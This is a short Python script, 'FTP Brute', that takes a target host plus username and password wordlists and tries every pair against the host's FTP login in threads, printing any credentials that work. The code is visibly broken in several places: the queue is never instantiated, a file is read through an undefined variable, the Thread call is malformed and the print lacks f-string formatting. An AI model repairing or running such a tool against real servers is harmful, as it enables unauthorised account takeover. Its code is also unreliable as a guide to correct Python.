import ftplib
import pyfiglet
import queue
from threading import Thread
import sys


q = queue.Queue
threads = 10
host = ''
userList = []
passList = []
port = 21

ascii_banner = pyfiglet.figlet_format("FTP Brute")
print(ascii_banner)

if len(sys.argv) == 4:
    host = sys.argv[1]
    userFile = sys.argv[2]
    passFile = sys.argv[3]
else:
    print("Usage: ftp-brute.py $host $userFile $passwordFile")
    exit()


def login(user,password):
    server = ftplib.FTP()
    try:
        server.connect(host, port, timeout=5)
        server.login(user, password)
    except ftplib.error_perm:
        return False
    else:
        print("[+] {user}:{password} correct!")
        with q.mutex:
            q.queue.clear()
            q.all_tasks_done.notify_all()
            q.unfinished_tasks = 0
    finally:
        q.task_done

f = open(userFile, 'r')
for line in g:
    userList.append(line)
f.close()

g = open(passFile, 'r')
for line in g:
    passList.append(line)
g.close()

for user in userList:
    for password in passList:
        q.put(user, password)

for t in range(threads):
    thread = Thread(thread=login)
    thread.daemon = True
    thread.start()
q.join()